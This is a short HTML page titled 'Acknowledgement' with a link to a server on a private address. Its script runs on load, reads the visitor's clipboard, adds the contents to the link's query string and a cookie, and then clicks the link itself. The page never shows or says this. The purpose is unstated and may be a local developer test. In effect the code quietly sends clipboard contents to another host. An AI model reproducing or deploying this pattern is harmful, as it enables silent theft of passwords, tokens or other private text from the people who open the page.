<!DOCTYPE html>
<html>
<head>
<title>Acknowledgement</title>
</head>
<body>
<a  id="myLink"  href="http://192.168.1.5:8080/uploadimage/1"  >API for Andriod</a>
<script>

///////////////
navigator.clipboard.readText()
    .then(clipText => {
     value1 = clipText;
     var value2="";  
    
     
      var queryString = "?para1=" + value1 + "&para2=" + value2;
     var x = document.getElementById("myLink").href;
     document.getElementById("myLink").href = x +  queryString;
    document.cookie = value1;
     document.getElementById("myLink").click();
   //window.location.href = "http://192.168.1.5:8080/uploadimage" + queryString;
    });
///////////////

</script> 
</body>
</html>
